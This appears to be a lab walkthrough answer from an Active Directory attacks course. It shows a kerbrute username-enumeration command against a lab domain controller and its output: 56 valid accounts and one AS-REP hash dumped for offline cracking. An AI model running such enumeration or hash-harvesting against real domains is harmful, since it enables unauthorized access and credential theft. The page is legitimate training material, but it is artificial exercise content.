# Section 10: Password Spraying - Making a Target User List

Module: 13. Active Directory Enumeration & Attacks

---

## Questions & Answers

### 1. Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint?

Context:
```bash
┌─[htb-student@ea-attack01]─[/opt]
└──╼ $kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 08/18/26 - Ronnie Flathers @ropnop

2026/08/18 05:12:10 >  Using KDC(s):
2026/08/18 05:12:10 >  	172.16.5.5:88

2026/08/18 05:12:10 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2026/08/18 05:12:10 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2026/08/18 05:12:10 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
2026/08/18 05:12:10 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
2026/08/18 05:12:10 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
2026/08/18 05:12:10 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
2026/08/18 05:12:10 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
2026/08/18 05:12:11 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2026/08/18 05:12:11 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local
2026/08/18 05:12:11 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:dbf82f8c3b05d644e76a4e4fb6e98aa3$6368e9920be3894c4ef66b8acb9259490ac34df8b8abceaf59a486aedcab9514c3ae0ab8b566ef09b42c8d1b60583a1e1832fa39bd048d11e62873c6f4eacd4666340bfc8eae8f9693be1ee356f275dc6777b6b6c663f3ecf76178cdc243769568e7786b16f38f9840dbf6cfc2a61ec1b96c94f74e7f37f18ee0d33076ec9215d183e5b2b5d46efdf58974f93213beca5efce2105a0219b4966a9c031cb585266d2bd258040247524e20b209b1e44be2baf8f505def9cca3ed8670c24bb9ba04f008f9ebb0c6264c431ccbb65c2f274c612a805d5c0d3b6d4ce758d56db75441ad4b9551ea100ddc95729cf21717e96760e8e543ad9d1d78ae0987304457e540fb650bc0a9724b55652b
2026/08/18 05:12:11 >  [+] VALID USERNAME:	 mmorgan@inlanefreight.local
2026/08/18 05:12:11 >  [+] VALID USERNAME:	 rramirez@inlanefreight.local
2026/08/18 05:12:11 >  [+] VALID USERNAME:	 jwallace@inlanefreight.local
2026/08/18 05:12:11 >  [+] VALID USERNAME:	 jsantiago@inlanefreight.local
2026/08/18 05:12:11 >  [+] VALID USERNAME:	 gdavis@inlanefreight.local
2026/08/18 05:12:11 >  [+] VALID USERNAME:	 mrichardson@inlanefreight.local
2026/08/18 05:12:11 >  [+] VALID USERNAME:	 mharrison@inlanefreight.local
2026/08/18 05:12:11 >  [+] VALID USERNAME:	 tgarcia@inlanefreight.local
2026/08/18 05:12:11 >  [+] VALID USERNAME:	 jmay@inlanefreight.local
2026/08/18 05:12:11 >  [+] VALID USERNAME:	 jmontgomery@inlanefreight.local
2026/08/18 05:12:11 >  [+] VALID USERNAME:	 jhopkins@inlanefreight.local
2026/08/18 05:12:11 >  [+] VALID USERNAME:	 dpayne@inlanefreight.local
2026/08/18 05:12:11 >  [+] VALID USERNAME:	 mhicks@inlanefreight.local
2026/08/18 05:12:11 >  [+] VALID USERNAME:	 adunn@inlanefreight.local
2026/08/18 05:12:11 >  [+] VALID USERNAME:	 lmatthews@inlanefreight.local
2026/08/18 05:12:11 >  [+] VALID USERNAME:	 avazquez@inlanefreight.local
2026/08/18 05:12:12 >  [+] VALID USERNAME:	 mlowe@inlanefreight.local
2026/08/18 05:12:12 >  [+] VALID USERNAME:	 jmcdaniel@inlanefreight.local
2026/08/18 05:12:12 >  [+] VALID USERNAME:	 csteele@inlanefreight.local
2026/08/18 05:12:12 >  [+] VALID USERNAME:	 mmullins@inlanefreight.local
2026/08/18 05:12:13 >  [+] VALID USERNAME:	 mochoa@inlanefreight.local
2026/08/18 05:12:13 >  [+] VALID USERNAME:	 aslater@inlanefreight.local
2026/08/18 05:12:13 >  [+] VALID USERNAME:	 ehoffman@inlanefreight.local
2026/08/18 05:12:13 >  [+] VALID USERNAME:	 ehamilton@inlanefreight.local
2026/08/18 05:12:14 >  [+] VALID USERNAME:	 cpennington@inlanefreight.local
2026/08/18 05:12:14 >  [+] VALID USERNAME:	 srosario@inlanefreight.local
2026/08/18 05:12:14 >  [+] VALID USERNAME:	 lbradford@inlanefreight.local
2026/08/18 05:12:15 >  [+] VALID USERNAME:	 halvarez@inlanefreight.local
2026/08/18 05:12:15 >  [+] VALID USERNAME:	 gmccarthy@inlanefreight.local
2026/08/18 05:12:15 >  [+] VALID USERNAME:	 dbranch@inlanefreight.local
2026/08/18 05:12:16 >  [+] VALID USERNAME:	 mshoemaker@inlanefreight.local
2026/08/18 05:12:18 >  [+] VALID USERNAME:	 mholliday@inlanefreight.local
2026/08/18 05:12:18 >  [+] VALID USERNAME:	 ngriffith@inlanefreight.local
2026/08/18 05:12:19 >  [+] VALID USERNAME:	 sinman@inlanefreight.local
2026/08/18 05:12:19 >  [+] VALID USERNAME:	 minman@inlanefreight.local
2026/08/18 05:12:19 >  [+] VALID USERNAME:	 rhester@inlanefreight.local
2026/08/18 05:12:19 >  [+] VALID USERNAME:	 rburrows@inlanefreight.local
2026/08/18 05:12:21 >  [+] VALID USERNAME:	 dpalacios@inlanefreight.local
2026/08/18 05:12:22 >  [+] VALID USERNAME:	 strent@inlanefreight.local
2026/08/18 05:12:22 >  [+] VALID USERNAME:	 fanthony@inlanefreight.local
2026/08/18 05:12:22 >  [+] VALID USERNAME:	 evalentin@inlanefreight.local
2026/08/18 05:12:22 >  [+] VALID USERNAME:	 sgage@inlanefreight.local
2026/08/18 05:12:23 >  [+] VALID USERNAME:	 jshay@inlanefreight.local
2026/08/18 05:12:24 >  [+] VALID USERNAME:	 jhermann@inlanefreight.local
2026/08/18 05:12:24 >  [+] VALID USERNAME:	 whouse@inlanefreight.local
2026/08/18 05:12:25 >  [+] VALID USERNAME:	 emercer@inlanefreight.local
2026/08/18 05:12:26 >  [+] VALID USERNAME:	 wshepherd@inlanefreight.local
2026/08/18 05:12:27 >  Done! Tested 48705 usernames (56 valid) in 16.381 seconds
```

**Answer:** `56`

---

[Back to Module Index](./README.md)
